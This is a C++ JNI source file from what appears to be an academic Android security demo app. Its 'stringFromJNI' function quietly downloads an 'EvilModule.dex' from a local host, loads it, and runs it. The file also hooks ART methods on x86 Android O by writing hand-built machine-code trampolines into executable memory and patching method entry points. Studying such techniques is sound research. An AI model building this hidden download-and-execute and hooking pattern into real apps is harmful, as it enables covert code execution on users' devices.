#include <jni.h>
#include <stdlib.h>
#include<string>
#include <string.h>
#include <errno.h>
#include <stdio.h>

#include <android/log.h>
#include <sys/mman.h>


#include <sys/stat.h>


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <netdb.h>
#include <sstream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include<memory>

#include <fstream>

#include "Connection.h"
#include "Downloader.h"
#include "Util.h"
#include "EvilModuleProvider.h"

using namespace std;
using namespace util;


/**
 * Data is based on https://android.googlesource.com/platform/art/+/oreo-release/runtime/art_method.h
 *  */
struct ArtMethod_x86_AndroidO {
    int declaring_class_ = 0;                       // GcRoot<mirror::Class> declaring_class_;
    int access_flags_ = 4;                          //std::atomic<std::uint32_t> access_flags_;
    int dex_code_item_offset_ = 8 ;                 //uint32_t dex_code_item_offset_;
    int dex_method_index_ = 12;                     // uint32_t dex_method_index_;
    int method_index_ = 16;                         // uint16_t method_index_;
    int hotness_count_ = 18;                        // uint16_t hotness_count_;
                                                    // struct PtrSizedFields {
    int dex_cache_resolved_methods_ = 20;           // mirror::MethodDexCacheType* dex_cache_resolved_methods_; // offset: 20
    int data_ = 24;                                 // void* data_; // offset: 24
    int entry_point_from_quick_compiled_code_ = 28; // void* entry_point_from_quick_compiled_code_; // offset: 28
                                                    //} ptr_sized_fields_;
    size_t artMethodSize = 32;
} artMethod;

//https://android.googlesource.com/platform/art/+/oreo-release/runtime/modifiers.h
int kAccNative = 0x0100;


unsigned char jniTrampoline[] = {
        0x57,  // push edi
        0x56,  // push esi
        0x55,  // push ebp
        0x83, 0xC4, 0xE4,  // add esp, -28
        0x50,  // push eax
        0x89, 0x4C, 0x24, 0x34,  // mov [esp + 52], ecx
        0x89, 0x54, 0x24, 0x38,  // mov [esp + 56], edx
        0x89, 0x5C, 0x24, 0x3C,  // mov [esp + 60], ebx
        0xC7, 0x44, 0x24, 0x08, 0x02, 0x00, 0x00, 0x00,  // mov [esp + 8], 2
        0x64, 0x8B, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xc4]  ; top_handle_scope
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x8D, 0x4C, 0x24, 0x04,  // lea ecx, [esp + 4]
        0x64, 0x89, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov fs:[0xc4], ecx  ; top_handle_scope
        0x8B, 0x08,  // mov ecx, [eax]
        0x89, 0x4C, 0x24, 0x0C,  // mov [esp + 12], ecx
        0x8B, 0x4C, 0x24, 0x38,  // mov ecx, [esp + 56]
        0x89, 0x4C, 0x24, 0x10,  // mov [esp + 16], ecx
        0x64, 0x89, 0x25, 0x8C, 0x00, 0x00, 0x00,  // mov fs:[0x8c], esp  ; top_quick_frame_method
        0x83, 0xC4, 0xE0,  // add esp, -32
        0x64, 0x8B, 0x0D, 0x34, 0x00, 0x00, 0x00,  // mov ecx, fs:[0x34]  ; 52
        0x85, 0xC9,  // test ecx, ecx
        0x0F, 0x84, 0x19, 0x00, 0x00, 0x00,  // jz/eq +25 (0x00008311)
        0x8D, 0x4C, 0x24, 0x2C,  // lea ecx, [esp + 44]
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0xFF, 0x15, 0x1C, 0x03, 0x00, 0x00,  // call fs:[0x31c]  ; pReadBarrierJni
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0xFF, 0x15, 0xC4, 0x01, 0x00, 0x00,  // call fs:[0x1c4]  ; pJniMethodStart
        0x89, 0x44, 0x24, 0x34,  // mov [esp + 52], eax
        0x8B, 0x4C, 0x24, 0x5C,  // mov ecx, [esp + 92]
        0x89, 0x4C, 0x24, 0x10,  // mov [esp + 16], ecx
        0x8B, 0x4C, 0x24, 0x30,  // mov ecx, [esp + 48]
        0x85, 0xC9,  // test ecx, ecx
        0x0F, 0x84, 0x04, 0x00, 0x00, 0x00,  // jz/eq +4 (0x0000833e)
        0x8D, 0x4C, 0x24, 0x30,  // lea ecx, [esp + 48]
        0x89, 0x4C, 0x24, 0x0C,  // mov [esp + 12], ecx
        0x8B, 0x4C, 0x24, 0x54,  // mov ecx, [esp + 84]
        0x89, 0x4C, 0x24, 0x08,  // mov [esp + 8], ecx
        0x8D, 0x4C, 0x24, 0x2C,  // lea ecx, [esp + 44]
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0x8B, 0x0D, 0x9C, 0x00, 0x00, 0x00,  // mov ecx, fs:[0x9c]  ; jni_env
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x8B, 0x4C, 0x24, 0x20,  // mov ecx, [esp + 32]
        0xFF, 0x51, 0x18,  // call [ecx + 24]
        0x89, 0x44, 0x24, 0x38,  // mov [esp + 56], eax
        0x8B, 0x4C, 0x24, 0x34,  // mov ecx, [esp + 52]
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0xFF, 0x15, 0xD0, 0x01, 0x00, 0x00,  // call fs:[0x1d0]  ; pJniMethodEnd
        0x8B, 0x44, 0x24, 0x38,  // mov eax, [esp + 56]
        0x83, 0xC4, 0x20,  // add esp, 32
        0x64, 0x83, 0x3D, 0x84, 0x00, 0x00, 0x00, 0x00,  // cmp fs:[0x84], 0  ; exception
        0x0F, 0x85, 0x07, 0x00, 0x00, 0x00,  // jnz/ne +7 (0x0000839c)
        0x83, 0xC4, 0x20,  // add esp, 32
        0x5D,  // pop ebp
        0x5E,  // pop esi
        0x5F,  // pop edi
        0xC3,  // ret
        0x64, 0x8B, 0x05, 0x84, 0x00, 0x00, 0x00,  // mov eax, fs:[0x84]  ; exception
        0x64, 0xFF, 0x15, 0xB8, 0x02, 0x00, 0x00,  // call fs:[0x2b8]  ; pDeliverException
        0xCC,  // int
};

unsigned char jniPayload[] = {
        0x57,  // push edi
        0x56,  // push esi
        0x55,  // push ebp
        0x83, 0xC4, 0xE4,  // add esp, -28
        0x50,  // push eax
        0xC7, 0x44, 0x24, 0x08, 0x01, 0x00, 0x00, 0x00,  // mov [esp + 8], 1
        0x64, 0x8B, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xc4]  ; top_handle_scope
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x8D, 0x4C, 0x24, 0x04,  // lea ecx, [esp + 4]
        0x64, 0x89, 0x0D, 0xC4, 0x00, 0x00, 0x00,  // mov fs:[0xc4], ecx  ; top_handle_scope
        0x8B, 0x08,  // mov ecx, [eax]
        0x89, 0x4C, 0x24, 0x0C,  // mov [esp + 12], ecx
        0x64, 0x89, 0x25, 0x8C, 0x00, 0x00, 0x00,  // mov fs:[0x8c], esp  ; top_quick_frame_method
        0x83, 0xC4, 0xF0,  // add esp, -16
        0x64, 0x8B, 0x0D, 0x34, 0x00, 0x00, 0x00,  // mov ecx, fs:[0x34]  ; 52
        0x85, 0xC9,  // test ecx, ecx
        0x0F, 0x84, 0x19, 0x00, 0x00, 0x00,  // jz/eq +25 (0x000012cd)
        0x8D, 0x4C, 0x24, 0x1C,  // lea ecx, [esp + 28]
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0xFF, 0x15, 0x1C, 0x03, 0x00, 0x00,  // call fs:[0x31c]  ; pReadBarrierJni
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0xFF, 0x15, 0xC4, 0x01, 0x00, 0x00,  // call fs:[0x1c4]  ; pJniMethodStart
        0x89, 0x44, 0x24, 0x20,  // mov [esp + 32], eax
        0x8D, 0x4C, 0x24, 0x1C,  // lea ecx, [esp + 28]
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0x8B, 0x0D, 0x9C, 0x00, 0x00, 0x00,  // mov ecx, fs:[0x9c]  ; jni_env
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x8B, 0x4C, 0x24, 0x10,  // mov ecx, [esp + 16]
        0xFF, 0x51, 0x18,  // call [ecx + 24]
        0x8B, 0x4C, 0x24, 0x20,  // mov ecx, [esp + 32]
        0x89, 0x0C, 0x24,  // mov [esp], ecx
        0x64, 0x8B, 0x0D, 0xA4, 0x00, 0x00, 0x00,  // mov ecx, fs:[0xa4]  ; self
        0x89, 0x4C, 0x24, 0x04,  // mov [esp + 4], ecx
        0x64, 0xFF, 0x15, 0xD0, 0x01, 0x00, 0x00,  // call fs:[0x1d0]  ; pJniMethodEnd
        0x83, 0xC4, 0x10,  // add esp, 16
        0x64, 0x83, 0x3D, 0x84, 0x00, 0x00, 0x00, 0x00,  // cmp fs:[0x84], 0  ; exception
        0x0F, 0x85, 0x07, 0x00, 0x00, 0x00,  // jnz/ne +7 (0x0000132c)
        0x83, 0xC4, 0x20,  // add esp, 32
        0x5D,  // pop ebp
        0x5E,  // pop esi
        0x5F,  // pop edi
        0xC3,  // ret
        0x64, 0x8B, 0x05, 0x84, 0x00, 0x00, 0x00,  // mov eax, fs:[0x84]  ; exception
        0x64, 0xFF, 0x15, 0xB8, 0x02, 0x00, 0x00,  // call fs:[0x2b8]  ; pDeliverException
        0xCC,  // int 3

};

class Hook {

private:
    void* targetArtMethod;
    void* backupArtMethod;
    void* jniTrampoline_;
    int hookAddress;
public:
    static inline void* genJniTrampoline() {

        unsigned char* usedPayload = jniPayload;
        unsigned int size = sizeof(jniPayload);
        util::logE("EVIL_LIB::HOOK", "trampoline size: %i", size);
        void* buf = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);

        if(buf == MAP_FAILED) {
            std::string errorMessage(strerror(errno));
            errorMessage = "mmap failed: " + errorMessage;
            const char* msg = errorMessage.c_str();
            util::logE("EVIL_LIB::HOOK", "mmap failed!");
            return NULL;
        }

        memcpy(buf, usedPayload, size);

        return buf;
    }

public:

    Hook(void* targetArtMethod, int hookAddress) {
        this->targetArtMethod = targetArtMethod;
        this->hookAddress = hookAddress;
        this->backupArtMethod = malloc(artMethod.artMethodSize);
        memcpy(this->backupArtMethod, this->targetArtMethod, artMethod.artMethodSize);
        this->jniTrampoline_ = genJniTrampoline();
    }

    void activate() {
        memcpy((char *) targetArtMethod + artMethod.data_, (char *) &hookAddress, 4);

        memcpy((char *) targetArtMethod + artMethod.entry_point_from_quick_compiled_code_,
               &this->jniTrampoline_, 4);

        // set the target method to native so that Android O wouldn't invoke it with interpreter
        int access_flags = read32((char *) targetArtMethod + artMethod.access_flags_);
        util::logE("EVIL_LIB::HOOK", "access flags is 0x%x", access_flags);
        access_flags |= kAccNative;
        memcpy((char *) this->targetArtMethod + artMethod.access_flags_, &access_flags, 4);
    }

    void deactivate() {

    }

    ~Hook(){
        free(this->backupArtMethod);
        this->backupArtMethod = NULL;
    }

    static inline uint32_t read32(void *addr) {
        return *((uint32_t *)addr);
    }
};

jobject loadClass(jobject loader, const char *, JNIEnv *env) throw(ClassNotFoundException);

jobject loadReflectionMethod(jobject reflectionClass, const char *methodName, JNIEnv *env);

Hook* hook;

static int doBackupAndHook(void *targetMethod, int hookAddress) {
  hook = new Hook(targetMethod, hookAddress);
  hook->activate();
}


void hook_init(JNIEnv* env) {

}


/*
  public static void test() {

        ClassLoader loader = createDexPathClassLoader("EvilModule.apk");
        String className = "evil.evilmodule.EvilModule2";
        Class evilModuleClass = null;
        try {
            evilModuleClass = loader.loadClass(className);
        } catch (ClassNotFoundException e) {
            Log.e("ClassLoaderTest", "Couldn't load " + className, e);
            return;
        }

        Log.e("ClassLoaderTest", "Loaded successfully " + className);

        try {
            Method foo = evilModuleClass.getMethod("foo");
            foo.invoke(null);
        } catch (NoSuchMethodException e) {
            Log.e("ClassLoaderTest", "Couldn't find foo method!", e);
        } catch (IllegalAccessException | InvocationTargetException e) {
            Log.e("ClassLoaderTest", "Couldn't invoke foo!", e);
        }
    }
 * */

unsigned char trampoline1[] = {
        0xb8, 0x21, 0x43, 0x65, 0x87,
        0x66, 0xc7, 0x40, 0x12, 0x00, 0x00,
        0xb8, 0x78, 0x56, 0x34, 0x12,
        0xff, 0x70, 0x20,
        0xc3
};

void* generateExecutableCode(size_t size) {
    void* buf = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    if(buf == MAP_FAILED) {
        std::string errorMessage(strerror(errno));
        logE("generateExecutableCode", "mmap failed: %s", errorMessage.c_str());
        return NULL;
    }
    return buf;
}

void* genJniTrampoline(void* trampolineSource, size_t size) {

    //LOGE("trampoline size: %i", size);
    void* buf = generateExecutableCode(size);
    memcpy(buf, trampolineSource, size);
    return buf;
}



static void fooNative(JNIEnv* env, jclass clazz) {
    logE("Java_evil_evil_1module_EvilModule_fooNative", "called!");
}


extern "C"
JNIEXPORT jstring
JNICALL
Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    string hello = "Hello from C++";

    string evilModulePath;
    EvilModuleProvider provider(Service ("10.0.2.2", 5050));
    try {
        evilModulePath = provider.downloadEvilModule(env, "EvilModule.dex");
    } catch(DownloadException e) {
        logE("EVIL_LIB::stringFromJNI", "Couldn't download evil module: Cause: %s", e.what());
    }

    logE("EVIL_LIB::stringFromJNI", "Successfully downloaded evil module: %s", evilModulePath.c_str());


    jobject loader = createDexClassLoader(evilModulePath.c_str(), env);

    jobject evilModuleClass = NULL;

    try {
        evilModuleClass = loadClass(loader, "evil.evil_module.EvilModule", env);
    } catch (ClassNotFoundException e) {
        logE("EVIL_LIB::stringFromJNI", "Couldn't load EvilModule: %s", e.what());
    }


    logE("EVIL_LIB::stringFromJNI", "Successfully loaded evil module");
    jmethodID evilMethod = env->GetStaticMethodID((jclass)evilModuleClass, "foo", "()V");

    int hookAddress = (int)(size_t) fooNative;

    memcpy((char *) evilMethod + artMethod.data_, (char *) &hookAddress, 4);
    // set the target method to native so that Android O wouldn't invoke it with interpreter
    int access_flags = Hook::read32((char *) evilMethod + artMethod.access_flags_);
    util::logE("EVIL_LIB::HOOK", "access flags is 0x%x", access_flags);
    access_flags |= kAccNative;
    memcpy((char *) evilMethod + artMethod.access_flags_, &access_flags, 4);

    void* trampoline = genJniTrampoline(jniPayload, sizeof(jniPayload));
    memcpy((char *) evilMethod + artMethod.entry_point_from_quick_compiled_code_,
           &trampoline, 4);

    env->CallStaticVoidMethod((jclass)evilModuleClass, evilMethod);

    //std::remove(evilModulePath.c_str());
    logE("EVIL_LIB::stringFromJNI", "Done");

    return env->NewStringUTF(hello.c_str());
}


jobject loadClass(jobject loader, const char* className, JNIEnv *env) throw(ClassNotFoundException){

    // Get function ClassLoader.loadClass()
    jclass loaderClass = env->GetObjectClass(loader);
    jmethodID classLoadClass = env->GetMethodID(loaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");

    // load the evil module
    jstring classNameJava = env->NewStringUTF(className);
    jobject evilModuleClass = (jclass) env->CallObjectMethod(loader, classLoadClass, classNameJava);

    bool evilModuleLoaded = !env->ExceptionCheck();

    if (!evilModuleLoaded) {

        jthrowable exception = env->ExceptionOccurred();
        env->ExceptionClear();
        jstring message = getExceptionMessage(env, exception);

        const char* msg = env->GetStringUTFChars(message, NULL);

        std::string messageObject(msg);
        env->ReleaseStringUTFChars(message, msg);

        ostringstream ss;
        ss << "Couldn't load class: " << messageObject.c_str();
        throw ClassNotFoundException(ss.str());
    }

    return evilModuleClass;
}